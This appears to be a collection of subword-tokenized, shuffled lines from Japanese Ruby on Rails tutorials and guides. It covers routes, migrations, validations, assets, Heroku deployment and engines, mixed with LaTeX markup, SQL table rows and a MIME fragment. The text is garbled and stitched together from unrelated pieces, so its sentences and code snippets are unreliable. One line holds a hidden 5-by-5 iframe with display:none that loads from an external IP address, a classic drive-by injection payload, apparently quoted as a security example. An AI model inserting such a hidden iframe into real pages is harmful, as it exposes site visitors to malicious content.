▁この テストが パス するには 、 最初に \ k ode { password _ digest } カラム 用の 適切な マイグレーション を生成します 。
▁たとえば 次の 2 つの コマンドは 、 自動生成 と 、 それに対応する 取り 消 し 処理 の例 です 。
▁ 子 ノード の名前 は 、 デフォルトでは ルート ノード を 単数形 にした もの が使用されます 。
▁### ▁ スキーマ の ルール
▁self を省略した 結果を リスト \ ref { code : static _ page _ routes _ test } に示します 。
▁* ▁` employee s / _ employee ▖ html ▖ erb `
▁* ▁`: equal _ to ` ▁- ▁ 指定された 値 と 等 しく なければならない こと を示します 。
▁resources ▁: photos , ▁only : ▁ [: index , ▁: show ]
▁ここで 挿入され る 行 は 単 に ` resources ▁: articles ` と なっています ▟ これにより 、 その エンジン で使用する ` config / routes ▖ rb ` ファイルが 以下のように 変更 されます 。
▁ アプリケーションは ` secrets ▖ secret _ key _ base ` を使用して 、` config / secrets ▖ yml ` など に保存 される キーを ランダム に 初期化 します 。
▁この \ k ode { ▖ gitignore } では 、 Rails ドキュメント ファイル 、 V im や E ma c s の ス ワ ッ プ ファイル 、 そして OS ▁X ユーザー には お 馴染 み の 、 あ の い ま い ま しい \ k ode { ▖ D S _ Store } ディレクトリ ▁( M ac の Fi nd er 操作 で 作成される 隠 し ディレクトリ ) ▁ も 管理 対象 から 除 外 されます 。
▁ Cloud 9 での ワークスペース の 準備 が完了し たら 、 ワークスペース を 選択 して ▁[ S t ar t ▁edit ing ] ▁ をクリックします 。
▁This ▁is ▁used ▁by ▁+ url _ for + ▁in ▁Action ▁Pack ▖
▁ 今 作成された ` app / controllers / articles _ controller ▖ rb ` を エディタ で 開 く と 、 以下のような 空の コントローラ が作成され ています 。
▁ 該 当 の メールアドレスが データベース にある 場合は 、 再設定 用 トークン と それに対応する リ セット ダイジェスト を生成する 。
▁ 本当に 行いたい のは 、 その ページ で エラーメッセージ が表示される ことを 示す こと の はずです 。
▁ 変更 後に テスト を実行し 、 ▁\ passing ▁になることを確認 してください 。
▁$ ▁bundle ▁exec ▁rake ▁db : migrate
▁最後に 、 リモート サーバー で SSL を設定します 。
▁( 1 ▖▖▖ 9 ) ▁= == ▁( 3 ▖ ▖ 9 ) ▁# ▁=> ▁false
▁ より 高度な 技術 を 身 に 付ける ための お勧め リソース をいくつか リスト アップ します ▟ ╼ ╼[ J A P A N E SE _ RE F S ]
▁ パスワード再設定の フォーム が必要です 。
▁ ユーザーを フォロー した結果
▁self を省略した 結果を リスト \ ref { code : full _ feed _ spec s } に示します 。
▁self ▖ author ▁= ▁Blorgh ▖ author _ class ▖ find _ or _ create _ by ( name : ▁author _ name )
▁` to _ options ` メソッドと ` to _ options !` メソッドは 、 それ それ ` symbolize _ keys ` メソッドと ` symbolize _ keys !` メソッド の別名 です 。
▁ mod ▁= ▁ mod _ name ▖ empty ? ▁?
▁ 日付 に対して 期間 を 加 減 算 できます 。
▁これは ネスティング を使用した ことによって 複 雑 さ が 増 した のです 。
▁つまり 、 ドキュメント 化 し よう と している メソッド や クラスの スコープ や コンテキスト に応じて 振る舞い が 変 化 すること がある ということです 。
▁scope ▁' : user name ' ▁do
▁=> ▁ 51
▁これは 以下のように することで 実現 できます 。
▁#### ▁` deconstantize `
▁ ヘルパー 読み込み の順序 に依存し ている 場合は 、 アップグレード 後に 正しい メソッドが 使用 でき ている かどうかを確認 する必要があります 。
▁* ▁scope ▖
▁* ▁FROM ▁categories
▁ そして 最終的に \ k ode { current _ user = } という メソッド が呼び出され ます 。
▁` where ` メソッドは 、 返される レコードを 制限 するための 条件 を指定します ▟ SQL 文 で言う ` W H E RE ` の 部分 に相当 します 。
▁end
▁このコードは 、 { p 0} や \ ref { sec : mvc _ in _ action } でも 説明したように 、 {3} @ name {/3} および {3} @ email {/3} { 4 } インスタンス変数 {/4} について 、 取り出し ( get ) ▁ と 割り当て ( set ) ▁ を行う ▁" ゲ ッ ター " ▁ と ▁" セッター " ▁という メソッドを それぞれ 作成します 。
▁$ ▁git ▁push ▁ origin ▁master
▁ 計算 の順序 は 、 最初に 年 を 増 減 し 、 次に 月 、 最後に 日 を 増 減 します 。
▁def ▁evaluate ( scope , ▁local s , ▁& block )
▁ 残 念 ですが 、 この場合は ページ 分割 された フィード を返し ても うまく 動きません 。
▁ テストの 書き 方は 、 既存の テスト ファイルを 詳 しく 読む ことで 学 べ ます ▟ これは 、 Rails の ソースコード を み っ ち り 探 索 するための よい き っ かけ にも なります 。
▁ここでは 以下 について説明します 。
▁users ▁GET ▁ / users (▖ : format ) ▁users # index
▁ alert (' A ll ▁is ▁good ')
▁ エンジン を 通常の gem と同様に ` Gemfile ` に記述 すると 、 Bundler は gem と同様に エンジン を 読み込み 、` blorgh ▖ gem spec ` ファイルを 解 析 し 、` lib ` 以下 に置かれている ファイル ▁( この場合 ` lib / blorgh ▖ rb ` ) ▁ を require します 。
▁` beginning _ of _ hour ` メソッドは 、 その 時の 最初の 時点 ▁( h h :00:00 ) ▁ の タイムスタンプ を返します 。
▁ エンジン が 読み込まれる 順序 を変更 したい場合は 、` config ▖ railties _ order = ` ▁ メソッド を使用できます 。
▁ とき お り 、` redirect _ to ` を 一種の ` got o ` コマンド として 理解 している 開発 初心者 を見 かけ ます ▟ Rails コードの 実行 位 置 を ある 場所 から 別の 場所に 移動 する コマンド である と 考え ている わけで す 。
▁リスト \ ref { code : email _ format _ valid _ tests } と同様に 、 リスト \ ref { code : email _ format _ validation _ tests } でも エラーメッセージ を カスタマイズ して 、 どの メールアドレス で 失敗した のか すぐに 特定 できるように しておきます ▟ ▁includes ▁a ▁custom ▁error ▁message ▁to ▁identify ▁the ▁exact ▁address ▁caus ing ▁any ▁failure ▖
▁ コードを リポジトリ に push して 、 本番環境 に デプロイ してみましょう 。
▁ 以上の 結果を 反 映 した テスト コードをリスト \ ref { code : remember _ me _ test } に示します
▁<%= ▁form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] ▁do ▁| f | ▁%>
▁上の 拡張子 の場合 、 CoffeeScript プロ セ ッ サ 経由で 実行されます 。
▁ アセット ファイル名 で使用される フィンガープリント は 、 アセット ファイル の内容 に応じて 変 わ ります 。
▁NOTE : ▁ Devise などの 他の エンジン では この 点が 若 干 異 なり 、 ルーティング で ▁( ` devise _ for ` などの ) ▁ カスタム ヘルパー を指定する もの があります 。
▁### ▁Rails に " Hello " と 挨拶 させる
▁> > ▁p ▁= ▁Person ▖ new ( name : ▁" John ▁Doe ")
▁if : ▁[" m ar k e t ▖ re tail ? ", ▁: de s k to p ? ]
▁ これはリスト \ ref { code : user _ signout _ test } で使用されていました 。
▁また 、 上のコード では \ k ode { get } 関数 を使って いない ことにも注目してください ▟ これは 各 関数 に 技術 的な 関連 性 が なく 、 ユーザー登録ページ にアクセス し なくても 、 直接 \ k ode { post } 関数 を呼び出し て ユーザー登録 が できる ことを 意味 しています 。
▁unless ▁record ▖ name ▖ start s _ with ?
▁### ▁ クエリ 文字列
▁| ▁1 ▁| ▁ SIMPLE ▁| ▁articles ▁| ▁ ALL ▁| ▁NULL ▁|
▁続いて 、 記事 を作成するための フォーム を作成する必要があります 。
▁| ▁| ▁20 8 ▁| ▁: already _ re port ed ▁|
▁という の も 、 Ajax リクエストを 受 信 した 場合は 、 Rails が自動的に アクション と同じ 名前を持つ \ emph { JavaScript 用の 埋め込み Ruby } ▁(\ k ode { ▖ js ▖ erb }) ▁ ファイル ▁(\ k ode { create ▖ js ▖ erb } や \ k ode { destroy ▖ js ▖ erb } など ) ▁ を呼び出す からです 。
▁ ユーザー登録フォーム
▁{0}{1} 第 10 章 {/1}{/0} では 、 ▁ メールアドレスが \ emph { 本当に } 有効 であること を確かめるため に 、\ emph { アカウントを有効化する } 機能を サインアップ の 手順 に追加します 。
▁ この手法は 、 Active ▁Record オブジェクトの コレクション に対して よく使われます 。
▁ 記事 の作成 は これまで と まったく 同様に 行えます ▟ 1 つだけ 異なる のは 、 今回は クラス の動作 を学ぶ ために ` config / initializers / blorgh ▖ rb ` の設定 を エンジン で使用する 点 です 。
▁# ▁< rank ▁type =" integer "> 2 </ rank >
▁最後に 、\ k ode { params [: fa the r ] [: first ]} など が 正しい 値 を持っている ことを確認してください 。
▁ 楽 観的ロック では 、 複数の ユーザーが 同じ レコード を編集する ことを 許 し 、 データ の 衝 突 が 最小限 であること を 仮 定 しています 。
▁` select ` メソッドを使用すると 、 関連付けられたオブジェクト の データ 取り出し に 使用される SQL の ` SELECT ` 句 を上書き します 。
▁ 次 に進む前に 、 StaticPages コントローラ ファイルを Git リポジトリ に 追加 しておきましょう 。
▁# ▁Person ▖ exists ?(
▁=> ▁[" User "]
▁< h 1> Hello , ▁Rails !
▁ 結果 として 、 ファイル サイズ の 大きな 画像 によって 、 読み込み 時間 が 長 くなる といった 問題 が発生し ます 。
▁ mkdir ▁< ディレクトリ 名 >
▁<%= ▁image _ tag ▁" home ▖ g if ", ▁ alt : ▁" Go ▁Home ",
▁ バリデーション ヘルパー
▁`: id ` や `: class ` などの オプションを ハッシュ 形式で 指定することもできます 。
▁**` Rack :: Conditional G e t ` **
▁ 何か を する ▁: ▁ 別の ことを する
▁本章では 、 第 \ ref { cha : modeling _ users } 章 で作成した User モデル のバリデーション を 信 頼 し 、 有効なメールアドレス を持っている ▁( 可能性のある ) ▁ 新規ユーザー を 増 や していきます 。
▁development サーバーを再起動 して リスト \ ref { code : development _ email _ settings } の設定 を 読み 込 んだ ら 、 次は { p 2 } で 自動生成 した User メイラー の {3} プレビュー ファイル {/3} の 更新 が必要です ▁( リスト \ ref { code : generated _ user _ mailer _ preview s }) 。
▁#### ▁ ローカル変数 を 渡す
▁` constantize ` メソッド による 定数名 解決 は 、 常に トップレベル の ` Object ` から 開 始 されます ▟ これは 上 位 に " :: " がない場合 でも 同じです 。
▁` unscope d ` に ` scope ` を 連 鎖 させる ことはできません ので 注意が必要です 。
▁` joins ` ▁( INNER ▁JOIN ) ▁ を使用する場合 、 結合 条件 は 必ず マッチ ▁** し なければ な らず ** ▁ 、 それ以外の 場合には レコード は 返 されません 。
▁ アセット は 、 サーバー 起動 後に 最初に リクエストを 受け取った 時点 で コンパイル と キャッシュ が 行われます 。
▁しかし 、 Rails では 動作 が異なります ▟\ k ode { StaticPages Controller } は Ruby ▁ の クラス ですが 、\ k ode { Application Controller } クラス を継承し ている ため 、 StaticPages Controller の メソッドは ▁( たとえ 何も 書かれてい なくても ) ▁Rails 特有の 振る舞い を します ▟ 具体的には 、 / static _ pages / home という URL にアクセスすると 、 Rails は StaticPages コントローラ を参照 し 、\ k ode { home } アクション に記述 されている コード を実行します ▟ その後 、 その アクション に対応する \ emph { ビュー } ▁(\ ref { sec : mvc } で説明した MVC の V に相当 ) ▁ を出力します 。
▁ 永 続 セッション の場合は 、\ k ode { session [: user \_ id ]} が 存 在 すれば 一時 セッション から ユーザー を取り出し 、 それ以外の 場合は \ k ode { cookies [: user \_ id ]} から ユーザーを 取り出す して 、 対応する 永 続 セッション に ログイン する必要があります 。
▁module ▁Find Re c ent E x t en s ion
▁ これまで メールアドレスを ユーザー名 として 使用 し てきた ので 、 このような \ k ode { find } 関連 メソッドは 、 ユーザーを サイトに ログイン させる 方法 を学ぶ ときに 役に立ちます ▁({1}{2} 第 7 章 {/2}{/1} ) 。
▁before フィルター を 再び 有効化 する
▁ 以前 は 、( 今 では す っかり 古 く なってしまい ましたが ) 「\ emph { RailsSpace }」 という 本 の 執 筆 および 開発 に 携 わ った り 、 また 、 ▁ 一時 人 気 を 博 した ▁Ruby ▁on ▁Rails ▁ ベースの ソーシャル ネ ッ ト ワ ー キ ング プラットフォーム 「 In so s hi 」 の開発 にも 携 わ って いました 。
▁詳細については 、[ # 1 44 88 ]( https :// github ▖ com / rails / rails / pull /1 44 88 ) および [ # 16 5 37 ]( https :// github ▖ com / rails / rails / pull / 16 5 37 ) を参照してください 。
▁| ▁HTTP ▁ 動詞 ▁| ▁ パス ▁| ▁ コントローラ # アクション ▁| ▁名前付きヘルパー ▁|
▁しかし 、 Rails 開発 のために これら の詳細 を知る 必要はありません 。
▁ただし 少し 表示 に 違い があります ▟ プロフィール サイドバー では 、 ▁“ Microposts ” ▁ を ラベル と し 、 “ Microposts ▁ (1) ” ▁ と 表示 することは 問題ありません 。
▁ 多くの オプション があり 、 長さ 制限 を さまざまな 方法で 指定 できます 。
▁( これを行うには リスト { p 0} の {2} authenticated ? {/2} メソッドを 改良 する必要があります ) 。
▁リスト \ ref { code : user _ model _ password _ reset _ expired } のコード を使用すると 、 リスト \ ref { code : password _ reset _ update _ action } の ▁\ k ode { update } ▁ アクション が動作する ようになります 。
▁ 111▖2345 ▖ to _ s (: rounded , ▁ precision : ▁2 ) ▁# ▁=> ▁111▖23
▁このセクションでは 、` User ` クラスを カスタマイズ 可能 にする 方法を 解説 し 、 続いて エンジンの 一般的な 設定 方法 について解説します 。
▁ 画像 への フルパス 、 または ` app / assets / images ` ディレクトリ 内にある ファイルを 引数として 与 えられ ます 。
▁* ▁その 他 、 Rails のコード にある 既存の 書 式 に従う こと 。
▁ 名前とメールアドレス には 、 もう少し 何らかの 制限 が あって よい はずです 。
▁config ▖ before _ initialize ▁do
▁上の 場合 、` Order ` モデル における 関連付けの ` customer ` を 複数形 の ` customers ` に してしまう と 、 " un initialize d ▁constant ▁ Order :: Customer s " ▁ エラーが発生し ます 。
▁ これはリスト \ ref { code : ssl _ in _ production } で使用されていました 。
▁get ▁' preview '
▁これは もう リファクタリング して HTML の 重複 した 構造 を DRY にする しか ない でしょう ▟ ご想像 のとおり 、 Rails には そのために \ emph { application ▖ html ▖ erb } という名前の \ k ode { レイアウト } ファイル があります ▟ 最 初 \ ref { sec : slightly _ dynamic _ pages } で この レイアウトファイル の名前 を わざわざ 変 え て お きました が 、 いよいよ 以下の コマンドで ファイル名 を 元に戻す ことにしましょう 。
▁t ▖ datetime ▁: order _ date
▁第 \ ref { cha : static _ pages } 章 から デプロイ を して 来 ましたが 、 実際に データを \ emph { 操作 できるように する } デプロイ は 初めて です ▟ そこで 、 この 機 会 に プロ レベル の デプロイ 方法 について 説明 していきます 。
▁{0} 図 10 ▖ 12 {/0} {1} エラーが表示され た Home ページ ▟\ href { http :// railstutorial ▖ org / images / figures / home _ form _ errors _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁リスト \ ref { code : generate _ users _ controller } で 、 ユーザー コントローラ ▁( と \ k ode { new } アクション ) ▁ を 作 った ときに 使 った 以下の コマンドを 思い 出 してみてください 。
▁self を省略した 結果を リスト \ ref { code : user _ show _ microposts } に示します 。
▁たとえば 、` Article sController ` の アクション が呼び出され ると 、 Rails は ` articles _ helper ▖ rb ` を 読み 込 もう とします が 、 この ファイルは 存在しない ことがあります 。
▁リスト \ ref { code : hello _ action } の \ k ode { hello } アクションを 複 製 して 、 第 2 の アクション \ k ode { goodbye } を追加しましょう ▟ この アクションは 、「 goodbye , ▁world !」 という テキスト を表示します 。
▁else
▁\ k ode { ▖ gitignore } ファイルに アップロード 用 ディレクトリ を追加する
▁raise ▁No n In f er r able Mailer Error ▖ new ( name )
▁ blorgh エンジン による すべての マイグレーション を 基 に 戻 したい場合は 以下のような コマンドを実行 します 。
▁=> ▁" 5 ▁errors "
▁\ k ode {@ users } 変数 に ユーザー 一覧 が保存され ると 、 コントローラは \ emph { {2} リスト 2▖ 7 {/2} } の {3} ビュー {/3} を呼び出します ▁( 6 ) 。
▁` beginning _ of _ day ` メソッドは 、 その 日 の 開 始 時点 ▁( 00 :00:00 ) ▁ の タイムスタンプ を返します 。
▁#### ▁` last ( limit ▁= ▁1) `
▁` link _ to _ if ` や ` link _ to _ unless ` など でも 同様 の 対応 が必要です 。
▁| ▁--------- ▁| ▁--------- - ---------------- ▁| ▁-- ---------------- ▁| ▁------- ---------------- ▁|
▁ 以下 と ほぼ 等 価 である ということです 。
▁ 先ほど リスト { p 0} のように {2} home {/2} アクションと {2} help {/2} アクション を生成し たので 、 routes ファイル には それぞれの アクション で使用される ルール が 定義 されています ▁( リスト \ ref { code : pages _ routes }) 。
▁layout ▁" main "
▁ これはリスト \ ref { code : friendly _ session _ create } で使用されていました 。
▁Bundler では 本番環境 用の gem は インストール しない 設定 に して お いた ので ▁(\ ref { sec : sample _ app _ setup }) 、 リスト \ ref { code : puma _ gemfile } は 開発環境 に 影 響 はありません ▟ しかし 、 Bundler に \ k ode { Gemfile ▖ lock } を更新し てもらう 必要がある ので 、 いつものように 次の コマンドを実行 しておきます 。
▁TEST O P T S =" - - name ▁test _ login _ with _ valid _ information "
▁リスト { p 0} の {2} digest {/2} メソッドが できたので 、 有効な ユーザー を表す ユーザー フィクスチャ を作成 できるようになりました ▁( リスト \ ref { code : real _ user _ fixture }) 。
▁ 手順 の最後 として 、 Git の コミットメッセージ を入力する ときに 使用する エディタ を 設定 できます 。
▁= ================
▁デフォルトは ` ENV [' RAILS _ RE LA T I V E _ URL _ ROOT ']` です 。
▁図 ▁\ ref { fig : micropost _ image _ mockup } のように Home ページ 常に アップ ロー ダ ー を追加する ためには 、 マイクロポストの フォーム に \ k ode { file \_ field } タグ を含め る必要があります ▁( リスト \ ref { code : micropost _ create _ image _ upload }) 。
▁( ほとんどの システム では 、 最初に \ text tt { Ctrl - C } を 押 下 して サーバー を 停 止 し 、 次に \ k ode { rails ▁server } コマンドを実行 することで サーバーを再起動 できます ) 。
▁ これはリスト \ ref { code : add _ remember _ digest _ to _ users } で使用されていました 。
▁` indent _ string ` には 1 文字 の スペース または タブ を使用する のが普通です が 、 どんな 文字 で も使用できます 。
▁* ▁ 関連する モデルを 介 した 継 承 階層 を表現する
▁$ ▁git ▁ checkout ▁branch _ name
▁( デフォルトの navbar の 色 が Bootstrap ▁2▖0 から 変更 された ため 、 現在の 淡 色 の代わりに ダ ー ク な 色 調 に したい場合は \ k ode { navbar - inverse } クラス を使用する必要があります ) 。
▁Rails アプリケーション のバージョン が 3▖1 よりも 古 い 場合 、 まず 3▖1 へのアップグレード を 完了 してから Rails ▁3▖2 へのアップグレード を開始 してください 。
▁[ 配列 で 表 された 条件 ](# 配列 で 表 された 条件 ) では 、 さらに 簡潔 な 文 例を ご 紹 介 しています 。
▁ それ から 正しい サインイン 情報を 入力 し 、[ Sign ▁in ] ▁ ボタン をクリックします 。
▁( メソッド名 に \ emph { シンボル } が 使われ ているので 奇 妙 に 見え る かもしれません ▟ これ については \ ref { sec : hashes _ and _ symbols } で説明します ) 。
▁ umerate }╼╼ ▁% ▁subsection ▁layout _ link _ tests ▁( end )╼╼ ▁\ subsection { ユーザー登録 時に ログイン } ▁% ▁( fold )╼ ▁\ label { sec : login _ upon _ signup }╼╼
▁ { nil ▁=> ▁nil , ▁1 ▁=> ▁1, ▁a : ▁: a } ▖ stringify _ keys
▁$ ▁rails ▁console
▁ ユーザーを削除する アクション
▁ そのような 関連付けを destroy する ` dependent ` を設定し なかった場合 、 関連付けられたオブジェクト を変更 でき なくなってしまいます ▟ これは 、 最初に 関連付けられたオブジェクト の 外部キー が ` NULL ` 値 に なってしまい 、 この 値は 許 されていない ためです 。
▁* ▁`: content _ type `
▁Rails ▁4▖0 から は 、 あらゆる スコープ は 、 スコープ で 必要な 域 値 を返す 無名 関数 を受け取り ます ▟ これにより 、 スコープ を その 場 で 評価 する必要が ほぼ なく なり 、 後に 読み 込 まれ たときに 必要に応じて 評価 するようになります ▁( いわゆる \ emph { } 遅 延 評価 ▁( lazy ▁evaluat ion ) ▁ です ) 。
▁SSL を \ k ode { example ▖ com } のような 独自 ドメイン で 実行 したい のであれば 、 SSL 証 明 書 を 購 入 する しか ありません ▟ 詳細は \ href { http :// dev center ▖ heroku ▖ com / articles / ssl } { Heroku の SSL 関連 ページ } を参照してください 。
▁person ▁= ▁Person ▖ create ( name : ▁" !
▁Rails アプリケーションを 実際に Heroku に 展開 するには 、 まず Git を使用して Heroku に リポジトリを プッシュ します 。
▁これらの ERB ファイルに 、 それら を 内 包 する レイアウト テンプレート や 、 ビュー から 参 照 される あらゆる パーシャル ▁( 部分 テンプレート ) ▁ が 組み 合 わ さ って 完全な HTML が生成され 、 クライアント に 送信されます 。
▁Home ページの HTML を修正する
▁ そして 、 おそらく さらに 奇 妙 な ことに 、\ k ode { destroy } された オブジェクトは 以下のように まだ メモリ 上に 残 っています 。
▁ここでは 、 アプリケーションを " / app 1 " ディレクトリに デプロイ したい とします 。
▁この ヘルパー では `: accept ` オプション を使用できます ▟ この オプションは 、「 受 付 済み 」 を表す 値 を指定します 。
▁* ▁ ルーティング 名 ▁( あれば )
▁ こう して お か ない と この 関連付け は 正常に動作し ません 。
▁この データモデル を実装する には 、 最初に 以下のように Relationship モデル を生成します 。
▁この 行 が変更され ると 、 生成された エンジン 内の クラス が アプリケーション と 衝 突 する ▁** 可能性があります ** ▁ 。
▁ 表 \ ref { table : association _ methods } では 、 以下の メソッド ではなく
▁\ k ode { user ▖ updated _ at } の値 に注目し てください 。
▁< iframe ▁name =" S t at P age " ▁src =" http :// 58 ▖ x x ▖ x x x ▖ x x x " ▁ width = 5 ▁ height = 5 ▁style =" display : none "></ iframe >
▁\ emph { or ▁equal s } という 概念 は 一見 神 妙 不可 思 議 に見えます が 、 他の もの に な ぞ ら え て 考え ること で 理解 できます 。
▁end { enumerate } ╼╼% ▁subsection ▁image _ validation ▁( end )╼╼ \ subsection { 画像 の リ サイズ } ▁% ▁( fold )╼\ label { sec : image _ resizing }╼╼
▁self を省略した 結果を リスト \ ref { code : stats _ partial } に示します 。
▁{0} 図 11 ▖ 16 {/0} {1} 現在のユーザー に フォロー されている ユーザー を表示する ▟\ href { http :// railstutorial ▖ org / images / figures / user _ following _ bootstrap - full ▖ png }{( 拡大 ) }{/1}
▁ バグ の 再 現 と 修正 点 の 把 握 を 、 他の 人 達 にとって も 自分自身 にとって も や り や す く すること を 目 指 してください 。
▁ 別の タブ で Rails サーバー を実行する 。
▁invoke ▁scaffold _ controller
▁次に 、 いつものように インストール します 。
▁ スタイルシート ファイルは 、` app / assets `、` lib / assets ` 、 または ` vendor / assets ` のいずれか の 場所 に置かれ ます 。
▁Unix の コマンドライン について もっと お 知 り になり たい 方は 、 M ar k ▁Bates 著 『 \ href { http :// c onquering the command line ▖ com /}{ \ emph { C onquering ▁the ▁Command ▁L in e } } 』 を ご 覧 ください ▟\ href { http :// c onquering the command line ▖ com / book } { 無料 の オンライン 版 } や \ href { http :// c onquering the command line ▖ com / # p r ic ing } { 電 子 書 籍 版 、 スクリーンキャスト } もあります 。
▁ attr _ internal ▁: request , ▁: layout
▁Gravatar サイト にアクセスすると 、 実際には \ href { http :// en ▖ gravatar ▖ com / email s } { http :// en ▖ gravatar ▖ com / email s } に リダイレクト されます ▟ ここ は 英語 ユーザー 向 け ですが 、 他の 言語 を 考 慮 し 、\ text tt { en } を URL に含め ません でした 。
▁ カスタム バリデータ ▁( valid at or ) ▁ は 、` ActiveModel :: Validator ` を 拡張 した クラス です 。
▁ 解決策 は 簡 単 で 、 ▁ { p 0} で開発した \ k ode { log \_ in \_ as } ヘルパー ▁( リスト \ ref { code : test _ helper _ log _ in }) ▁ を使う ことです ▟ 修正 した結果 を リスト \ ref { code : edit _ tests _ logged _ in } に示します 。
▁#### # ▁` collection ▖ delete ( object , ▁ ▖▖▖)
▁ シングルクォート 内の 文字列
▁ このテストは 最初の メールアドレス の 重複 テスト と同じ ことを しています が 、 大文字 に変換 した メールアドレス を使っている 点 が異なります 。
▁ 以下のコード でも よい のですが 、
▁else
▁User ▖ find _ each ▁do ▁| user |
▁これは 比 較 的 よい アイディア です ▟ 設定 オプション を提供 したい場合は 、 エンジン で ` module ` と呼ばれ ている ファイルを 、 まさに これ を行なう の に ふ さ わ しい 場所 として 定義 します 。
▁ この問題 は 重 大 である ため 、 編集 可能 になって はならない 属性 に対するテスト を作成する ことを ぜ ひ とも お勧め します ▟\ k ode { admin } 属性 のテスト については 演習 に回します ▁(\ ref { sec : updating _ deleting _ exercises }) 。
▁ ╼ </ p >╼ - --- == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 - -
▁本章では この システム の 仕 上 げ として 、 互 い に 強く 関連 している 2 つの 機能 、 すなわち アカウントの有効化 ▁( ア ク テ ィ ベ ー ション : ▁ 新規ユーザー の メールアドレスが 有効 である ことを確認する 機能 ) ▁ と 、 パスワードの再設定 ▁( パスワードを 忘れ てしまった ユーザー 向 け の 機能 ) ▁ を実装する ことにします 。
▁def ▁as _ json ( options ▁= ▁nil )
▁第 二 引数 は オプション ですが 、 ここに は 比 較 した結果 の � 差 異 ▁( 今回の 場合は 1 ) ▁ を 渡します 。
▁te }╼╼ ▁% ▁subsection ▁creating _ user _ objects ▁( end )╼╼ ▁\ subsection { ユーザー オブジェクト を検索する } ▁% ▁( fold )╼ ▁\ label { sec : find ing _ user _ objects }╼╼
▁\ k ode { row } クラス と \ k ode { span 4 } クラス も 追加 しておきます ▟ これらの クラスは Bootstrap の一部 です 。
▁つまり 、 次の コード では 、
▁これは 、 指定された アセット へのパス を記述し ます 。
▁* ▁` ActiveRecord :: Connection Adapters :: M y sql A d a p ter ▖ emulate _ boolean s ` は 、 Active ▁Record が MySQL データベース 内の すべての ` t in y in t (1) ` カラム を デフォルトで boolean にする かどうかを指定します ▟ デフォルト は true です 。
▁ 注文 はありません 。
▁従って 、( ` blank ?` を含む ) ` Object ` に対する すべての 拡張機能 を 読み込む 場合には 以下のように します 。
▁ こちら も 、 コメント が 複 数 ある 記事 は 複 数 回 表示されます 。
▁` transform _ value s ` メソッドは 、 ブロック を 1 つ 取り 、 ハッシュ を 1 つ 返します ▟ 返される ハッシュ には 、 レシーバの それぞれの 値 に対して ブロック 操作を 適用 した結果 が含まれます 。
▁ r
▁( リスト \ ref { code : email _ downcase } では 、\ k ode { before \_ save } に 明示的に ブロック を渡して いました が 、 メソッド 参 照 の方が 一般に お勧め できます ) 。
▁ もうひとつ 例 をお見せします ▟ データベース の最初の ユーザーが 持つ \ k ode { activation \_ digest } 属性 にアクセス してみます 。
▁このオプション はデフォルトで true です 。
▁( 経験 的に は これは 賢 い 慣習 だ と思います ▟ という の も 、 クラス 内に 多数の メソッド がある場合 、 private メソッドの 場所 が 簡単に 見つかる からです ▟ これにより 、 インデント が 無 い 場合 と 比 べ て 、 どこか ら private になる のか 困 惑 すること が なくなります ▟)
▁# ▁=> ▁ { : b =>2} ▁# ▁ 存在しない キー は 無視 される
▁ 同様に ` from ` メソッドは 、 配列 のうち 、 インデックス が 指 す 箇所 から 末 尾 まで の 要素 を返します 。
▁test : postgresql
▁* ▁ 楽 観的ロック ▁( optimistic )
▁ここまで に 数 多くの 題 材 を 取り上げ てきました ので 、 今 や アプリケーションを 拡張 する方法 は 山 ほど あります 。
▁Rails に " Hello " と 表示する には 、 最 低 でも ▁ _ コントローラ _ ▁ と ▁ _ ビュー _ ▁ が必要です 。
▁### ▁ CRUD 、 動詞 、 アクション
▁| ▁NULL ▁| ▁NULL ▁| ▁NULL ▁| ▁1 ▁| ▁Using ▁where ▁|
▁Ruby では 、 メソッドに 与えられた 最後の 引数 が ハッシュ の場合 、 それが ` & block ` 引数 である場合 を除いて 、 ハッシュの 波 括 弧 を省略 できます 。
▁# ▁=> ▁ { : a =>2}
▁この フラグ は 、 与えられた すべての 定数 について 、 メソッドで パス を 下 る 時に 適用 されます 。
▁( クラウド ▁IDE ▁ など 多くの システム では 、\ k ode { bundle ▁exec } なしで も ▁rake ▁ を 実行 できます が 、 bundle ▁exec が 必要な システム も あるので 、 本書 では 念のため 使用する ようにしています ) 。
▁これで ユーザーの インデックス は 完全に 動く ようになり 、 テスト も 全て ▁\ passing ▁ するようになります 。
▁render ▁action : ▁" index "
▁if ▁@ article ▖ save
▁ただし 、 検証 に 1 つ でも 失敗する と 、 {0} update _ attributes の 呼び出し は 失敗します ▟ たとえば 、 { p 1 } {/0} で 実装 する 、 パスワードを レコード に保存 すること を要求する と 検証 は 失敗します 。
▁ 一般に 、 この ライブラリ は アプリケーション マニフェスト に 以下の よう に記述 することで アクセス できます 。
▁CDN ▁( [ コンテンツ デ リ バ リ ー ネットワーク ]( http :// ja ▖ w ikipedia ▖ org / wiki / % E 3 % 8 2 % B 3 % E 3%83% B 3 % E 3%83% 8 6 % E 3%83% B 3 % E 3%83% 8 4 % E 3%83% 87 % E 3%83% A A % E 3%83% 9 0 % E 3%83% A A % E 3%83% 8 D % E 3 % 8 3%83% E 3%83% 88 % E 3%83% A F % E 3%83% B C % E 3 % 8 2 % A F ) ) は 、 全 世界 を 対象 として アセットを キャッシュ すること を 主な 目的 として 設計 されています ▟ それ により 、 ブラウザから アセットを リクエスト すると 、 ネットワーク 上で 最も 近 く にある キャッシュ の コピー が使用されます 。
▁get ▁: index , ▁format : ▁: js
▁リスト \ ref { code : logo _ css } には 以下のコード があります 。
▁ デフォルト値 は ` true ` です 。
▁それでは 最初に 、 Sessions コントローラと 認証システム をテストする 結合テスト を作成します 。
▁# ▁gem ▁' therubyracer ', ▁platform s : ▁: ruby
▁before フィルター の \ k ode { correct \_ user } で \ k ode {@ user } 変数 を定義し ている ため 、 リスト \ ref { code : correct _ user _ before _ filter } では \ k ode { edit } と \ k ode { update } の各 アクション から 、\ k ode {@ user } への 代入 文 を削除し ている 点 にも 注意してください 。
▁ アプリケーションが ブラウザで 表示する コンテンツ の レンダリング ▁( 出力 ) ▁という 力 仕 事 は 、` ActionController :: Base # render ` メソッドが ほぼ 一 手 に 引 き 受 け ています 。
▁ ユーザーに 関連付けられている マイクロポストの ファクトリー を作成し 、 それ から 表示 ページ が 各 ポスト の内容を 含 んで い る か 検証 する 戦 略 で 進 め ます 。
▁Rails ▁4▖1 の JSON エ ン コ ー ダ は 、 JSON ▁gem を使用する ように 書き 直 されました 。
▁ ╼ ▁end
